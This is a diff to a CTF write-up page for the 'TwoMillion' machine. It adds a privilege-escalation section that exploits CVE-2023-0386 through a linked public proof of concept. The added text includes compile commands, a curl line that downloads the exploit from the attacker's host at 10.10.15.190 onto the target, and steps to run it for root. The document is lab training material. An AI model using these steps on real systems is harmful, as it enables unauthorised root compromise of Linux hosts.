@@ -115,7 +115,7 @@ TwoMillion | ARTIFACTS
             
             
                 <dt>reading time</dt>
-                <dd>4 minutes</dd>
+                <dd>5 minutes</dd>
             
         </dl>
     </section>
@@ -220,6 +220,23 @@ TwoMillion | ARTIFACTS
 <p>As observed there were various findings, but what seemed of interest was an email exchange located in /var/mail. Indicating that the system is potentially vulnerable to CVE-2023-0386</p>
 <p><img src="/captures/screens/TwoMillion/shot-022.png" alt="shot-022"></p>
 <hr>
+<p>CVE-2023-0386 Proof of Concept</p>
+<p>A concise exploitation procedure is found:
+
+<a href="https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c" target="_blank" rel="noopener">https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c</a>
+</p>
+<p>The compilation process requires libfuse for the implemention of the malicious filesystem:</p>
+<ul>
+<li>apt install libfuse-dev</li>
+<li>gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl</li>
+</ul>
+<p>Then a local python server is set up on port 9000, for a the download of the exploit on the target machine with the use of curl.</p>
+<p>curl -O http://10.10.15.190:9000/poc</p>
+<p><img src="/captures/screens/TwoMillion/shot-023.png" alt="shot-023"></p>
+<p>All that was required, for the privilege escalation, was to make the scrip executable with chmod +x and then run it.</p>
+<p><img src="/captures/screens/TwoMillion/shot-024.png" alt="shot-024"></p>
+<hr>
+<p>Thus, we become root and have control over the entire system. With the flag captured with cat /root/root.txt</p>
 
     </div>
 </div>
